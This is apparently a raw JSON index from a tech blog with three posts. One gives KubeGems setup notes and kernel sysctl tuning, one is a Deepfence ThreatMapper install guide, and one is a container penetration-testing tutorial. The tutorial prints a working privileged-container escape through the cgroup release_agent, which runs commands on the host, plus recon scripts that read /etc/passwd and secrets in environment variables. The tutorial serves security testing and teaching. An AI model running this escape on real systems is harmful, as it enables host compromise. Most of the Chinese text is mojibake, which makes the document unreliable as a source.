pvæœåŠ¡æ‰€åœ¨ç©ºé—´\n\n\nDevelopmentRun localkubegems have 5 components:\n\nservice: provide kubegems api server.\nmsgbus: provide instant communication forÂ service,Â agentÂ andÂ dashboard.\nworker: execute long time task.\nagent: proxy all request by service in a single cluster.\ncontroller: reconcile all kubegems CRD requests.\n\nChoose one of these component you want to run, then:\n\nprepare certs:Â cd scripts &amp;&amp; bash generate-tls-certs.sh\nmake build\n./bin/kubegems &#123;component&#125; gencfg &gt; config/config.yaml\nModifyÂ config/config.yamlÂ yourself, for different component, config.yaml is different, you can also use args or enironment variables.\n./bin/kubegems &#123;conpoment&#125;\n\næ›´å¤šé…ç½®Linuxå†…æ ¸ä¼˜åŒ–inux kernelå‚æ•°ä¼˜åŒ–æ˜¯ä¸ºKubeGems workerèŠ‚ç‚¹æ›´å¥½ã€ç¨³å®šçš„æœåŠ¡å®¹å™¨è€Œæ€»ç»“å‡ºæ¥çš„ä¸€å¥—å†…æ ¸ä¼˜åŒ–åŸºçº¿ã€‚å…¶ä¸­éƒ¨åˆ†å‚æ•°æ¶‰åŠåˆ°æœºå™¨æ€§èƒ½çš„åŠ¨æ€è°ƒæ•´ï¼Œæ–‡æ¡£é‡Œä¼šç»™å‡ºè®¡ç®—å…¬å¼ï¼Œè¯·è¯»è€…è‡ªè¡Œæ ¹æ®æƒ…å†µè½¬æ¢ã€‚\n# è®¡ç®—å†…å­˜æ€»é‡mem_total_bytes &#x3D; memtotal_mb * 1024 * 1024\n\nä¿®æ”¹sysctl.confä½¿ç”¨vimæ‰“å¼€å¹¶ç¼–è¾‘/etc/sysctl.confæ–‡ä»¶\nkernel.panic &#x3D; 10kernel.panic_on_oops &#x3D; 10kernel.sysrq&#x3D;0\n# æœ€å¤§è¿›ç¨‹æ•°#ç”¨å‘½ä»¤ps -eLf | wc -l æŸ¥çœ‹å½“å‰å®é™… PID æ•°é‡ï¼Œæ£€æŸ¥å½“å‰ç”¨æˆ·çš„ PID æ•°é‡\nkernel.pid_max&#x3D;196605\n#æœ€å¤§çº¿ç¨‹æ•°\nkernel.threads_max&#x3D;196605\nkernel.ctrl-alt-del&#x3D;1\n#æ‰“å¼€coredns\nkernel.core_pattern&#x3D;&#x2F;var&#x2F;log&#x2F;core.%e.%p.%t\nkernel.shmmax &#x3D; &#123;&#123; mem_total_bytes&#x2F;&#x2F;2 &#125;&#125;\nkernel.shmall &#x3D; &#123;&#123; mem_total_bytes&#x2F;&#x2F;2&#x2F;&#x2F;4096 &#125;&#125;\nkernel.msgmnb &#x3D; 65536\nkernel.msgmax &#x3D; 65536\nfs.file-max &#x3D; 1048576\n#æ¯ä¸ª linux è¿›ç¨‹å¯ä»¥æŒæœ‰å¤šä¸ª fdï¼Œæ¯ä¸ª inotify ç±»å‹çš„ fd å¯ä»¥ watch å¤šä¸ªç›®å½•ï¼Œæ¯ä¸ªç”¨æˆ·ä¸‹æ‰€æœ‰è¿›ç¨‹ inotify ç±»å‹çš„ fd å¯ä»¥ watch çš„æ€»ç›®å½•æ•°æœ‰ä¸ªæœ€å¤§é™åˆ¶\nfs.inotify.max_user_instances&#x3D;524288\nfs.inotify.max_user_watches&#x3D;524288\n#å¦‚æœwattchæ•°è¿‡å¤šå¯ä»¥æ‰“å¼€ inotify_add_watch è·Ÿè¸ªï¼Œè¿›ä¸€æ­¥ debug inotify watch è€—å°½çš„åŸå› :\n#echo 1 &gt;&gt; &#x2F;sys&#x2F;kernel&#x2F;debug&#x2F;tracing&#x2F;events&#x2F;syscalls&#x2F;sys_exit_inotify_add_watch&#x2F;enable\n#å…³é—­swapç©ºé—´\nvm.swappiness &#x3D; 0\nvm.max_map_count&#x3D;1048575\nvm.dirty_ratio &#x3D; 60\nvm.dirty_background_ratio &#x3D; 5\nvm.min_free_kbytes &#x3D; &#123;&#123; mem_total_bytes&#x2F;&#x2F;1024&#x2F;&#x2F;100*5 &#125;&#125;\nnet.ipv4.tcp_syncookies &#x3D; 1\nnet.ipv4.tcp_synack_retries &#x3D; 2\nnet.ipv4.tcp_dsack &#x3D; 1\nnet.ipv4.tcp_sack &#x3D; 0\nnet.ipv4.tcp_fack &#x3D; 1\nnet.ipv4.conf.all.forwarding &#x3D; 1\nnet.ipv4.conf.default.forwarding &#x3D; 1\nnet.ipv4.ip_forward &#x3D; 1\nnet.ipv4.conf.all.send_redirects &#x3D; 0\nnet.ipv4.conf.default.send_redirects &#x3D; 0\nnet.ipv4.conf.all.accept_source_route &#x3D; 0\nnet.ipv4.conf.default.accept_source_route &#x3D; 0\nnet.ipv4.conf.all.rp_filter &#x3D; 0\nnet.ipv4.conf.default.rp_filter &#x3D; 0\nnet.ipv4.conf.all.accept_redirects &#x3D; 0\nnet.ipv4.conf.default.accept_redirects &#x3D; 0\nnet.ipv4.conf.all.secure_redirects &#x3D; 0\nnet.ipv4.conf.default.secure_redirects &#x3D; 0\nnet.ipv4.conf.all.bootp_relay &#x3D; 0net.ipv4.conf.all.proxy_arp &#x3D; 0\nnet.ipv4.icmp_echo_ignore_broadcasts &#x3D; 1\nnet.ipv4.icmp_ignore_bogus_error_responses &#x3D; 1\nnet.ipv4.tcp_rfc1337 &#x3D; 1\nnet.ipv4.tcp_congestion_control &#x3D; cubic\nnet.core.default_qdisc &#x3D; pfifo_fast\nnet.ipv4.tcp_ecn &#x3D; 2\nnet.ipv4.tcp_reordering &#x3D; 3\nnet.ipv4.tcp_retries2 &#x3D; 8\nnet.ipv4.tcp_retries1 &#x3D; 3\nnet.ipv4.tcp_no_metrics_save &#x3D; 1\nnet.ipv4.tcp_slow_start_after_idle &#x3D; 0\nnet.ipv4.tcp_fin_timeout &#x3D; 10\n#tcp_keepalive_timeéœ€è¦ä½äºipvsä¸­çš„tcp_timeoutæ—¶é•¿ï¼Œä¸€èˆ¬æƒ…å†µä¸‹è¦ä½äºkube-proxy lvsçš„900s\nnet.ipv4.tcp_keepalive_time &#x3D; 600\nnet.ipv4.tcp_keepalive_probes &#x3D; 5\nnet.ipv4.tcp_keepalive_intvl &#x3D; 15\nnet.ipv4.ip_local_port_range &#x3D; 20000 65535\n#é¢„ç•™ç»™kubernetes serviceçš„nodeportç«¯å£èŒƒå›´ï¼Œä¸è®¾ç½®å¯èƒ½ä¼šé€ æˆ#kubernetesåœ¨åšæœåŠ¡æ¢é’ˆæ—¶ä½¿ç”¨ä¸‹åˆ—èŒƒå›´ç«¯å£ï¼Œé€ æˆè¿æ¥è¢«å ç”¨è€Œå¤±è´¥ï¼Œå¼•èµ·æ¢é’ˆå¤±æ•ˆ\nnet.ipv4.ip_local_reserved_ports &#x3D; 30000-32768\n# æ¯ä¸ªç½‘ç»œæ¥å£æ¥æ”¶æ•°æ®åŒ…çš„é€Ÿç‡æ¯”å†…æ ¸å¤„ç†è¿™äº›åŒ…çš„é€Ÿç‡å¿«æ—¶ï¼Œå…è®¸é€åˆ°é˜Ÿåˆ—çš„æ•°æ®åŒ…çš„æœ€å¤§æ•°ç›®\nnet.core.netdev_max_backlog &#x3D; 16384\n#æ²¡æœ‰å¯ç”¨syncookiesçš„æƒ…å†µä¸‹ï¼Œsyn queue(åŠè¿æ¥é˜Ÿåˆ—)å¤§å°é™¤äº†å—somaxconné™åˆ¶å¤–ï¼Œä¹Ÿå—è¿™ä¸ªå‚æ•°çš„é™åˆ¶ï¼Œé»˜è®¤1024ï¼Œä¼˜åŒ–åˆ°65535ï¼Œé¿å…åœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹ä¸¢åŒ…\nnet.ipv4.tcp_max_syn_backlog &#x3D; 65535\n# è¡¨ç¤ºsocketç›‘å¬(listen)çš„backlogä¸Šé™ï¼Œä¹Ÿå°±æ˜¯å°±æ˜¯socketçš„ç›‘å¬é˜Ÿåˆ—(accept queue)ï¼Œå½“ä¸€ä¸ªtcpè¿æ¥å°šæœªè¢«å¤„ç†æˆ–å»ºç«‹æ—¶(åŠè¿æ¥çŠ¶æ€)\n#ä¼šä¿å­˜åœ¨è¿™ä¸ªç›‘å¬é˜Ÿåˆ—ï¼Œé»˜è®¤ä¸º 128ï¼Œåœ¨é«˜å¹¶å‘åœºæ™¯ä¸‹åå°ï¼Œä¼˜åŒ–åˆ° 16384ã€‚å‚è€ƒ https:&#x2F;&#x2F;imroc.io&#x2F;posts&#x2F;kubernetes-overflow-and-drop&#x2F;\nnet.core.somaxconn &#x3D; 16384\nnet.ipv4.tcp_window_scaling &#x3D; 1\nnet.ipv4.tcp_adv_win_scale &#x3D; 2\nnet.ipv4.tcp_rmem &#x3D; 4096 524287 16777216\nnet.core.rmem_default &#x3D; 524287\nnet.core.rmem_max &#x3D; 16777216\nnet.ipv4.tcp_wmem &#x3D; 4096 524287 16777216\nnet.core.wmem_default &#x3D; 524287\nnet.core.wmem_max &#x3D; 16777216\nnet.core.optmem_max &#x3D; 524287\nnet.ipv4.tcp_fastopen &#x3D; 3\nnet.ipv4.tcp_timestamps &#x3D; 1\nnet.ipv4.tcp_tw_recycle &#x3D; 0\nnet.ipv4.tcp_tw_reuse &#x3D; 0\nnet.ipv4.tcp_max_tw_buckets &#x3D; 360000\n# å½“å‰ arp è®°å½•æ•°æ¥è¿‘ gc_thresh3 æ¯”è¾ƒå®¹æ˜“ overflowï¼Œå› ä¸ºå½“ arp è®°å½•è¾¾åˆ° gc_thresh3 æ—¶ä¼šå¼ºåˆ¶è§¦å‘ gc æ¸…ç†#å½“è¿™æ—¶åˆæœ‰æ•°æ®åŒ…è¦å‘é€ï¼Œå¹¶ä¸”æ ¹æ®ç›®çš„ IP åœ¨ arp cache ä¸­æ²¡æ‰¾åˆ° mac åœ°å€ï¼Œè¿™æ—¶ä¼šåˆ¤æ–­å½“å‰ arp cache è®°å½•æ•°åŠ  1 æ˜¯å¦å¤§äº gc_thresh3#å¦‚æœæ²¡æœ‰å¤§äºå°±ä¼š æ—¶å°±ä¼šæŠ¥é”™: arp_cache: neighbor table overflow!# arp -an | wc -lå‚çœ‹arpè®°å½•æ•°\nnet.ipv4.neigh.default.gc_thresh3 &#x3D; 2048\nnet.ipv4.neigh.default.gc_thresh2 &#x3D; 1024\nnet.ipv4.neigh.default.gc_thresh1 &#x3D; 128\n#åˆ†æå¦‚æœæ˜¯ä¸šåŠ¡æœåŠ¡å¸¸è§æ€§çš„å‡ºç°&quot;arp_cache: neighbor table overflow!&quot;ï¼Œåˆ™è€ƒè™‘æ¨é€å°†ä¸‹åˆ—æ³¨é‡Šçš„å‚æ•°æ¨å€’æ‰€æœ‰NodeèŠ‚ç‚¹\n#net.ipv4.neigh.default.gc_thresh1 &#x3D; 80000\n#net.ipv4.neigh.default.gc_thresh2 &#x3D; 90000\n#net.ipv4.neigh.default.gc_thresh3 &#x3D; 100000\nnet.ipv4.neigh.default.gc_interval &#x3D; 120\nnet.ipv4.route.flush &#x3D; 1\nnet.ipv4.rt_cache_rebuild_count &#x3D; -1\nnet.netfilter.nf_conntrack_max &#x3D; 4194304net.nf_conntrack_max &#x3D; 4194304\nnet.netfilter.nf_conntrack_buckets &#x3D; 1048576\nnet.netfilter.nf_conntrack_tcp_timeout_fin_wait&#x3D;30\nnet.netfilter.nf_conntrack_tcp_timeout_time_wait&#x3D;300\nnet.netfilter.nf_conntrack_tcp_timeout_close_wait&#x3D;1\n#ç»´æŒé€šè¿‡NATç»´æŒTCPé•¿è¿æ¥çš„ä¼˜åŒ–,æ³¨æ„kube-proxyä¼šä¿®æ”¹æ­¤å‚æ•°\nnet.netfilter.nf_conntrack_tcp_timeout_established&#x3D;3600\n#tcp_keepalive_time+ tcp_keepalive_interval * tcp_keepalive_max_retry + 2mslå–æ•´\n#https:&#x2F;&#x2F;www.xinmeow.com&#x2F;2020&#x2F;05&#x2F;04&#x2F;iptables-nf_conntrack-%E6%9D%A1%E7%9B%AE%E7%9A%84%E8%80%81%E5%8C%96%E6%97%B6%E9%97%B4%E5%9B%A0%E8%AF%A5%E8%BF%9E%E6%8E%A5%E5%8F%91%E7%94%9F%E4%B8%A2%E5%8C%85%E8%80%8C%E5%8F%98%E7%9F%AD%EF%BC%8C&#x2F;\nnet.netfilter.nf_conntrack_tcp_timeout_max_retrans&#x3D;720\nnet.ipv6.conf.all.disable_ipv6 &#x3D; 1\nnet.ipv6.conf.default.disable_ipv6 &#x3D; 1\n\nç”Ÿæ•ˆé…ç½®æ‰§è¡Œsysctl -på‘½ä»¤å³æ—¶ç”Ÿæ•ˆé…ç½®æˆ–è€…æ‰§è¡Œrebooté‡å¯æœåŠ¡å™¨åå†…æ ¸é…ç½®ç”Ÿæ•ˆ\ndebug by vscode&#123;\n  &quot;name&quot;: &quot;service&quot;,\n  &quot;type&quot;: &quot;go&quot;,\n  &quot;request&quot;: &quot;launch&quot;,\n  &quot;mode&quot;: &quot;debug&quot;,\n  &quot;program&quot;: &quot;$&#123;workspaceFolder&#125;&#x2F;cmd&quot;,\n  &quot;cwd&quot;: &quot;$&#123;workspaceFolder&#125;&quot;, \n  &quot;args&quot;: [&quot;service&quot;] &#x2F;&#x2F; may also be msgbus, worker, agent, controller\n&#125;","slug":"kubegem","date":"2022-05-04T16:00:00.000Z","categories_index":"Cloud-Native","tags_index":"Kubernetes,k8s-dashboard,Docker,kubegem","author_index":"Moses"},{"id":"f8440a3d154328a49baadf9056bbbcfd","title":"å®¹å™¨å®‰å…¨å¹³å°-deepfence-ThreatMapper","content":"å®¹å™¨å®‰å…¨å¹³å°-deepfence0x01ç®€ä»‹ThreatMapper å¼€æºäº‘åŸç”Ÿå®‰å…¨å¯è§‚æµ‹æ€§å¹³å°\n0x02æ¶æ„å›¾Deepfence Threatç”±ä¸¤éƒ¨åˆ†ç»„æˆï¼š\n\nManagement Console:ç®¡ç†ç«¯åŒ…æ‹¬åº”ç”¨æ‹“æ‰‘ã€ä¸€èˆ¬SBOMsæ¼æ´ã€å¨èƒåœ°å›¾\nThreatMapper Sensor:é‡‡é›†å™¨\n\n0x03æ ¸å¿ƒèƒ½åŠ›ç•¥\n0x04å¯¹æ¯”ç•¥\n0x05QuickstartrequireManagement Console requie 4C 16G install docker &amp; docker-compose port 443ThreatMapper with helm require sc [[OpenEBS.md]]\n# Install OpenEBS, and wait for it to start up\nkubectl create ns openebs\nhelm install openebs --namespace openebs --repo &quot;https:&#x2F;&#x2F;openebs.github.io&#x2F;charts&quot; openebs --set analytics.enabled&#x3D;false\nkubectl get pods -o wide --namespace openebs -w\n\n# Install the Kubernetes metrics service (if not already installed)\nkubectl apply -f https:&#x2F;&#x2F;github.com&#x2F;kubernetes-sigs&#x2F;metrics-server&#x2F;releases&#x2F;download&#x2F;v0.6.1&#x2F;components.yaml\n\n# Configure the Deepfence ThreatMapper Helm Chart\nhelm repo add deepfence https:&#x2F;&#x2F;deepfence-helm-charts.s3.amazonaws.com&#x2F;threatmapper\n\n# Install the ThreatMapper console and wait for the pods to start up\nhelm install deepfence-console deepfence&#x2F;deepfence-console\nkubectl get pods -o wide -w\n\n# Optionally, install the Deepfence Router service and wait for the platform to deploy a load balancer\nhelm install deepfence-router deepfence&#x2F;deepfence-router\nkubectl get --namespace default svc -w deepfence-router\n\nManagement Console installsudo sysctl -w vm.max_map_count&#x3D;262144 # see https:&#x2F;&#x2F;www.elastic.co&#x2F;guide&#x2F;en&#x2F;elasticsearch&#x2F;reference&#x2F;current&#x2F;vm-max-map-count.html\n\nwget https:&#x2F;&#x2F;github.com&#x2F;deepfence&#x2F;ThreatMapper&#x2F;raw&#x2F;master&#x2F;deployment-scripts&#x2F;docker-compose.yml\ndocker-compose -f docker-compose.yml up --detach\nThreatMapper Sensor installinstall with dockerdocker run -dit --cpus&#x3D;&quot;.2&quot; --name&#x3D;deepfence-agent --restart on-failure --pid&#x3D;host --net&#x3D;host \\\n  --privileged&#x3D;true -v &#x2F;sys&#x2F;kernel&#x2F;debug:&#x2F;sys&#x2F;kernel&#x2F;debug:rw -v &#x2F;var&#x2F;log&#x2F;fenced \\\n  -v &#x2F;var&#x2F;run&#x2F;docker.sock:&#x2F;var&#x2F;run&#x2F;docker.sock -v &#x2F;:&#x2F;fenced&#x2F;mnt&#x2F;host&#x2F;:ro \\\n  -e USER_DEFINED_TAGS&#x3D;&quot;&quot; -e MGMT_CONSOLE_URL&#x3D;&quot;---CONSOLE-IP---&quot; -e MGMT_CONSOLE_PORT&#x3D;&quot;443&quot; \\\n  -e DEEPFENCE_KEY&#x3D;&quot;---DEEPFENCE-API-KEY---&quot; \\\n  deepfenceio&#x2F;deepfence_agent_ce:latest\ninstall with helmhelm repo add deepfence https:&#x2F;&#x2F;deepfence-helm-charts.s3.amazonaws.com&#x2F;threatmapper\n\nhelm install deepfence-agent deepfence&#x2F;deepfence-agent \\\n    --set managementConsoleUrl&#x3D;---CONSOLE-IP--- \\\n    --set deepfenceKey&#x3D;---DEEPFENCE-API-KEY---\n\n\ncheck\n\nè¿›é˜¶-intergrationsSIEM\nNotification\né•œåƒæ‰«æ\nticketing\nreport\n","slug":"å®¹å™¨å®‰å…¨å¹³å°-deepfence-ThreatMapper","date":"2022-04-21T03:36:00.000Z","categories_index":"Cloud-Native-Security","tags_index":"å®¹å™¨å®‰å…¨å¹³å°,äº§å“é€‰å‹,å¼€æºäº‘åŸç”Ÿå®‰å…¨,DeepFence,äº‘åŸç”Ÿå¨èƒåœ°å›¾","author_index":"Moses"},{"id":"187ba77175374873452e35cc1b1a9ffe","title":"å®¹å™¨å®‰å…¨-é’ˆå¯¹å®¹å™¨çš„æ¸—é€æµ‹è¯•æ–¹æ³•","content":"æ”»å‡»è€…æ¨¡å‹æ”»å‡»è€…æ¨¡å‹å®¹å™¨é€ƒé€¸å’Œé’ˆå¯¹Dockerå®ˆæŠ¤è¿›ç¨‹çš„æ”»å‡»ï¼Œåˆ†åˆ«å¯¹åº”ä½äºå®¹å™¨å†…éƒ¨çš„æ”»å‡»è€…å’Œä½äºè¿è¡Œäº†Dockerå®ˆæŠ¤è¿›ç¨‹çš„å®¿ä¸»æœºä¸Šçš„æ”»å‡»è€…ã€‚\nå…¶ä¸­ï¼Œå®¹å™¨é€ƒé€¸åŒ…æ‹¬å®¹å™¨å†…è¿›ç¨‹å½±å“åˆ°å®¿ä¸»æœºæˆ–å…¶ä»–å®¹å™¨ä¸¤ç§æƒ…å†µï¼Œç¤ºæ„å›¾å¦‚ä¸‹ï¼š\né’ˆå¯¹Dockerå®ˆæŠ¤è¿›ç¨‹çš„æ”»å‡»åˆ™æŒ‡å®¿ä¸»æœºä¸Šä½æƒé™æ”»å‡»è€…å€ŸåŠ©Dockerå®ˆæŠ¤è¿›ç¨‹è·å–åˆ°æ•æ„Ÿæ•°æ®æˆ–æ›´é«˜æƒé™ï¼Œç¤ºæ„å›¾å¦‚ä¸‹ï¼š\n![[A_Methodology_for_Penetration_Testing_Docker_Systems.pdf]]Sari Sultanç­‰äººå¯¹æ•´ä¸ªå®¹å™¨ç¯å¢ƒçš„æ½œåœ¨æ”»å‡»é¢å’Œæ”»å‡»å¯¹è±¡è¿›è¡Œæ¢³ç†ï¼ŒæŠ½è±¡å‡ºå››ç±»å¨èƒï¼š\nå®‰å…¨é—®é¢˜\næµ‹è¯•æ–¹æ³•\nç¯å¢ƒå˜é‡è¯»å–ç¯å¢ƒå˜é‡æœ¬èº«æ˜¯ä¸€ç§å¸¸ç”¨çš„å®¿ä¸»æœºä¸å®¹å™¨çš„é€šä¿¡æ–¹å¼ã€‚ç„¶è€Œï¼Œä½œä¸ºå®¹å™¨å†…çš„æ”»å‡»è€…ï¼Œä»–åŒæ ·è·å¾—ç¯å¢ƒå˜é‡ä¸­å¯èƒ½å­˜åœ¨çš„æ•æ„Ÿä¿¡æ¯ï¼Œä»è€Œæ‰©å¤§æˆ˜æœï¼Œå¦‚å€ŸåŠ©ç¯å¢ƒå˜é‡è®¾ç½®æ•°æ®åº“è®¿é—®å‡­è¯çš„åœºæ™¯ï¼š\n(host)$ docker run --rm -e MYSQL_ROOT_PASSWORD&#x3D;supersecret -- name&#x3D;database mariadb:latest\n(host)$ docker exec -it database bash (cont)# env  \n...\nMYSQL_ROOT_PASSWORD&#x3D;supersecret\nç‰¹æƒæ¨¡å¼æ£€æŸ¥å¯¹äºå®¹å™¨å†…çš„æ”»å‡»è€…æ¥è¯´ï¼Œç‰¹æƒæ¨¡å¼å‡ ä¹å°±æ„å‘³ç€å®¹å™¨é€ƒé€¸ã€‚å¦‚ä¸‹æ‰€ç¤ºï¼Œç‰¹æƒæ¨¡å¼æ„å‘³ç€å®¹å™¨å†…è¿›ç¨‹å°†å…·å¤‡ç­‰åŒäºå®¿ä¸»æœºä¸Šè¿›ç¨‹çš„æ‰€æœ‰æƒé™ï¼š\n(host)$ docker run -it --rm --privileged ubuntu:latest grep CapEff &#x2F;proc&#x2F;1&#x2F;status\n\nCapEff: 0000003fffffffff  \n(host)$ capsh --decode&#x3D;0000003fffffffff 0x0000003fffffffff&#x3D;cap_chown,cap_dac_override,\n\ncap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,\ncap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,\ncap_net_bind_service,cap_net_broadcast,cap_net_admin,\ncap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,\ncap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct, \n\ncap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,\ncap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,\ncap_audit_write,cap_audit_control,cap_setfcap,\ncap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,\ncap_block_suspend,cap_audit_read\n\nå€ŸåŠ©ç‰¹æƒæ¨¡å¼è¿›è¡Œå®¹å™¨é€ƒé€¸çš„æ–¹æ³•1.å¯åŠ¨ä¸€ä¸ªç‰¹æƒå®¹å™¨\ndocker run --rm -it --privileged ubuntu bash\n2.åœ¨å®¹å™¨å†…æ‰§è¡Œå‘½ä»¤è¯»å–å®¿ä¸»æœºè¿›ç¨‹åˆ—è¡¨\n# In the container\nmkdir &#x2F;tmp&#x2F;cgrp &amp;&amp; mount -t cgroup -o memory cgroup &#x2F;tmp&#x2F;cgrp &amp;&amp; mkdir &#x2F;tmp&#x2F;cgrp&#x2F;x\n \necho 1 &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;notify_on_release\nhost_path&#x3D;&#96;sed -n &#39;s&#x2F;.*\\perdir&#x3D;\\([^,]*\\).*&#x2F;\\1&#x2F;p&#39; &#x2F;etc&#x2F;mtab&#96;\necho &quot;$host_path&#x2F;cmd&quot; &gt; &#x2F;tmp&#x2F;cgrp&#x2F;release_agent\n \necho &#39;#!&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;cmd\necho &quot;ps aux &gt; $host_path&#x2F;output&quot; &gt;&gt; &#x2F;cmd\nchmod a+x &#x2F;cmd\n \nsh -c &quot;echo \\$\\$ &gt; &#x2F;tmp&#x2F;cgrp&#x2F;x&#x2F;cgroup.procs&quot;\n3.æ–¹æ³•åŸç†è¯¥æ”»å‡»æ‰‹æ³•å®é™…ä¸Šåˆ©ç”¨äº†Linux cgroup v1çš„notify_on_releaseç‰¹æ€§ï¼Œåœ¨æ™®é€šå®¹å™¨ä¸­ï¼Œç”±äºä¸å…·æœ‰SYS_ADMINæƒé™ï¼Œä»¥åŠAppArmorçš„é™åˆ¶ï¼Œè¿™ç§æ”»å‡»æ— æ³•æˆåŠŸã€‚å› æ­¤ï¼Œç‰¹æƒæ¨¡å¼æ˜¯å±é™©çš„ã€‚\næ¸—é€æµ‹è¯•é€ŸæŸ¥è¡¨æ¢æµ‹æ˜¯å¦æ˜¯å®¹å™¨ç¯å¢ƒé—®é¢˜ï¼š/.dockerenvæ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œls /.dockerenvæŸ¥çœ‹ã€‚\né—®é¢˜ï¼š/proc/1/cgroupä¸­æ˜¯å¦åŒ…æ‹¬/dockerå­—æ ·ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œgrep &#39;/docker&#39; /proc/1/cgroupæŸ¥çœ‹ã€‚\né—®é¢˜ï¼šå½“å‰ç¯å¢ƒå†…çš„è¿›ç¨‹æ•°æ˜¯å¦å°‘äº5ä¸ªï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œps auxæŸ¥çœ‹ã€‚\né—®é¢˜ï¼šPIDä¸º1çš„è¿›ç¨‹æ˜¯å¦æ˜¯å¸¸è§„initè¿›ç¨‹ï¼ˆå¦‚systemdæˆ–initï¼‰ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œps -p1æŸ¥çœ‹PIDä¸º1çš„è¿›ç¨‹ã€‚\né—®é¢˜ï¼šå½“å‰ç¯å¢ƒæ˜¯å¦ç¼ºå°‘å¸¸è§åº“æˆ–å·¥å…·ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œwhich xxxæ¥æŸ¥çœ‹å¸¸ç”¨å·¥å…·æ˜¯å¦å­˜åœ¨ï¼Œä¾‹å¦‚æ‰§è¡Œwhich sudoæ¥æŸ¥çœ‹sudoæ˜¯å¦å­˜åœ¨ã€‚\nè‡ªåŠ¨åŒ–è„šæœ¬#!&#x2F;bin&#x2F;bash\n\nDOCKER_ENV_FILE&#x3D;&#x2F;.dockerenv\nDOCKER&#x3D;docker\nDOCKER_CGROUP&#x3D;&#x2F;proc&#x2F;1&#x2F;cgroup\n\nls -al $DOCKER_ENV_FILE\ngrep &quot;$DOCKER&quot; $DOCKER_CGROUP\nps aux\nps -p1\nwhich sudo\nwhich apt\nwhich vi\nwhich ping\nwhich ssh\n\nä»å®¹å™¨å†…å‘èµ·æµ‹è¯•é—®é¢˜ï¼šå½“å‰ç”¨æˆ·æ˜¯ï¼Ÿ\næ“ä½œï¼šæ‰§è¡ŒidæŸ¥çœ‹å½“å‰ç”¨æˆ·å’Œç”¨æˆ·ç»„ã€‚\né—®é¢˜ï¼šå½“å‰ç¯å¢ƒä¸­å­˜åœ¨å“ªäº›ç”¨æˆ·ï¼Ÿ\næ“ä½œï¼šè¯»å–/etc/passwdæ•°æ®ï¼Œä¾‹å¦‚cat /etc/passwdã€‚\né—®é¢˜ï¼šå®¹å™¨æ“ä½œç³»ç»Ÿæ˜¯ï¼Ÿ\næ“ä½œï¼šè¯»å–/etc/os-releaseæ•°æ®ï¼Œè·å¾—æ“ä½œç³»ç»Ÿç›¸å…³ä¿¡æ¯ã€‚\né—®é¢˜ï¼šæœ‰å“ªäº›è¿›ç¨‹åœ¨å®¹å™¨å†…è¿è¡Œï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œps auxæŸ¥çœ‹ã€‚\né—®é¢˜ï¼šå®¿ä¸»æœºå†…æ ¸ç‰ˆæœ¬æ˜¯ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œuname -aæŸ¥çœ‹ã€‚\né—®é¢˜ï¼šå®¹å™¨å†…è¿›ç¨‹å…·æœ‰å“ªäº›æƒé™ï¼ˆcapabilitiesï¼‰ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œgrep CapEff /proc/self/statusè·å¾—æƒé™å€¼ï¼Œåœ¨å…¶ä»–ç³»ç»Ÿä¸Šæ‰§è¡Œcapsh --decode=valueå°†å‰é¢è·å¾—çš„å€¼è§£æä¸ºå…·ä½“æƒé™ã€‚ä¾‹å¦‚ï¼šé—®é¢˜ï¼šå½“å‰å®¹å™¨æ˜¯å¦è¿è¡Œåœ¨ç‰¹æƒæ¨¡å¼ï¼Ÿ\næ“ä½œï¼šå¦‚æœä¸Šä¸€æ­¥ä¸­å¾—åˆ°çš„æƒé™å€¼ä¸º0000003fffffffffï¼Œé‚£ä¹ˆå®¹å™¨å°±è¿è¡Œåœ¨ç‰¹æƒæ¨¡å¼ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè¿›è¡Œå®¹å™¨é€ƒé€¸ã€‚\né—®é¢˜ï¼šå®¹å™¨æŒ‚è½½äº†å“ªäº›å·ï¼Ÿ\næ“ä½œï¼šè¯»å–/proc/mountsæ•°æ®ï¼ŒæŸ¥çœ‹å·æŒ‚è½½æƒ…å†µã€‚\né—®é¢˜ï¼šç¯å¢ƒå˜é‡ä¸­æ˜¯å¦å­˜å‚¨äº†æ•æ„Ÿä¿¡æ¯ï¼Ÿ\næ“ä½œï¼šæ‰§è¡Œenvå‘½ä»¤ï¼Œåˆ—ä¸¾æ‰€æœ‰ç¯å¢ƒå˜é‡ã€‚\né—®é¢˜ï¼šå®¹å™¨å†…æ˜¯å¦æŒ‚è½½äº†Docker Socketï¼Ÿ\næ“ä½œï¼šæ£€æŸ¥/proc/mountsæ˜¯å¦åŒ…å«docker.sockæˆ–ç±»ä¼¼æ–‡ä»¶ã€‚é€šå¸¸/run/docker.sockæˆ–/var/run/docker.sockä¼šæ˜¯æŒ‚è½½ç‚¹ã€‚å¦‚æœå‘ç°æŒ‚è½½ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿè¿›è¡Œå®¹å™¨é€ƒé€¸ã€‚\né—®é¢˜ï¼šå“ªäº›ä¸»æœºæ˜¯å½“å‰ç¯å¢ƒä¸‹ç½‘ç»œå¯è¾¾çš„ï¼Ÿ\næ“ä½œï¼šæœ‰æ¡ä»¶çš„è¯åº”è¯¥ä½¿ç”¨nmapæ¢æµ‹ã€‚è¿˜å¯ä»¥å…ˆè¯»å–/etc/hostsæŸ¥çœ‹å®¹å™¨çš„IPåœ°å€ã€‚\nè‡ªåŠ¨åŒ–è„šæœ¬#!&#x2F;bin&#x2F;bash\n\nid\ncat &#x2F;etc&#x2F;passwd\ncat &#x2F;etc&#x2F;os-release\nps aux\nuname -a\ngrep CapEff 